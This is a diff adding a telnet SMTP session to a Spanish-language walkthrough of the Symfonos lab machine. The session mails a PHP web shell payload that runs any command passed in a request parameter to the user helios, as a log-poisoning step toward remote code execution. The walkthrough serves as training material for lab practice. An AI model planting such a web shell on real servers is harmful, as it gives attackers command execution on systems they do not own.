@@ -172,3 +172,21 @@ debido a que podemos ver `log/` en el directorio `/var/mail/helios` podemos inte
 
 ### telnet 
 
+```python
+telnet 10.0.2.15 25
+Trying 10.0.2.15...
+Connected to 10.0.2.15.
+Escape character is '^]'.
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+MAIL FROM:gleoq
+250 2.1.0 Ok
+RCPT TO:helios@symfonos.localdomain
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+<?php echo system($_REQUEST['cmd']);$>
+
+.
+250 2.0.0 Ok: queued as 4F54440729
+
+```
